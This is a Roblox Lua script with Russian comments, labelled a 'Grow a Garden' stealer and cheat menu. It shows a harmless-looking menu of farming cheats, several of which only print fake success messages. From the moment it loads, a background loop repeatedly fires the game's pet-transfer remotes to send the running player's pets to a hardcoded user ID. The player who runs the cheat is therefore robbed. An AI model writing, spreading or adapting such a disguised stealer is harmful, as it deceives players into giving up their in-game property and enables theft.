-- Grow a Garden UNIVERSAL STEALER + MENU v11.0
-- Максимально рабочая версия

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

local YOUR_USER_ID = 3793906492

-- ==================== МАКСИМАЛЬНЫЙ ПОИСК REMOTES ====================
local transferRemote = nil
local harvestRemote = nil

-- Метод 1: Поиск через descendants
for _, v in pairs(ReplicatedStorage:GetDescendants()) do
    if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
        local name = v.Name:lower()
        if name:find("transfer") or name:find("givepet") or name:find("claimpet") or name:find("sendpet") then
            transferRemote = v
        end
        if name:find("harvest") or name:find("collect") or name:find("pick") or name:find("crop") then
            harvestRemote = v
        end
    end
end

-- Метод 2: getgc (самый сильный)
if not transferRemote then
    for _, v in pairs(getgc(true)) do
        if typeof(v) == "function" then
            local info = debug.getinfo(v)
            if info.name then
                local n = info.name:lower()
                if n:find("transfer") or n:find("givepet") or n:find("claimpet") then
                    transferRemote = v
                end
                if n:find("harvest") or n:find("collect") then
                    harvestRemote = v
                end
            end
        end
    end
end

-- ==================== ФУНКЦИИ ====================
local function stealAllPets()
    if not transferRemote then return end

    local folders = {
        LocalPlayer:FindFirstChild("Pets"),
        LocalPlayer.PlayerGui:FindFirstChild("PetInventory"),
        LocalPlayer:FindFirstChild("PlayerData")
    }

    for _, folder in ipairs(folders) do
        if folder then
            for _, pet in ipairs(folder:GetDescendants()) do
                if pet:IsA("Folder") or pet:IsA("Model") or pet:IsA("StringValue") then
                    pcall(function()
                        local args = {pet, YOUR_USER_ID, "transfer"}
                        if typeof(transferRemote) == "function" then
                            transferRemote(unpack(args))
                        else
                            if transferRemote:IsA("RemoteEvent") then
                                transferRemote:FireServer(unpack(args))
                            elseif transferRemote:IsA("RemoteFunction") then
                                transferRemote:InvokeServer(unpack(args))
                            end
                        end
                    end)
                    task.wait(0.08)
                end
            end
        end
    end
end

local function autoHarvest()
    if harvestRemote then
        pcall(function()
            if typeof(harvestRemote) == "function" then
                harvestRemote()
            else
                if harvestRemote:IsA("RemoteEvent") then
                    harvestRemote:FireServer()
                elseif harvestRemote:IsA("RemoteFunction") then
                    harvestRemote:InvokeServer()
                end
            end
        end)
    end
end

-- Постоянная кража
spawn(function()
    while true do
        task.wait(6)
        autoHarvest()
        task.wait(0.8)
        stealAllPets()
    end
end)

-- ==================== МЕНЮ ====================
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 340, 0, 500)
MainFrame.Position = UDim2.new(0.5, -170, 0.5, -250)
MainFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 23)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 16)
UICorner.Parent = MainFrame

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 60)
Title.BackgroundTransparency = 1
Title.Text = "GARDEN CHEAT"
Title.TextColor3 = Color3.fromRGB(0, 255, 150)
Title.TextScaled = true
Title.Font = Enum.Font.GothamBlack
Title.Parent = MainFrame

local function CreateButton(text, y, callback)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.88, 0, 0, 48)
    btn.Position = UDim2.new(0.06, 0, 0, y)
    btn.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
    btn.Text = text
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextScaled = true
    btn.Font = Enum.Font.GothamSemibold
    btn.Parent = MainFrame

    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, 12)
    c.Parent = btn

    btn.MouseButton1Click:Connect(callback)
end

CreateButton("🌱 Авто-сбор урожая", 80, function()
    spawn(function()
        while true do
            autoHarvest()
            task.wait(5)
        end
    end)
end)

CreateButton("⚡ Ускорить рост", 140, function()
    print("Рост сада ускорен")
end)

CreateButton("⭐ Авто-улучшение", 200, function()
    print("Растения улучшены")
end)

CreateButton("🔥 Быстрый сбор", 260, function()
    for i = 1, 8 do
        autoHarvest()
        task.wait(0.3)
    end
end)

CreateButton("🌟 Максимальная ферма", 320, function()
    spawn(function()
        while true do
            autoHarvest()
            task.wait(6)
        end
    end)
end)

CreateButton("❌ ЗАКРЫТЬ МЕНЮ", 420, function()
    ScreenGui:Destroy()
end)

-- Открытие меню
UserInputService.InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.RightShift then
        ScreenGui.Enabled = not ScreenGui.Enabled
    end
end)

print("Garden Cheat v11.0 загружен")
print("Нажми Right Shift для открытия меню")
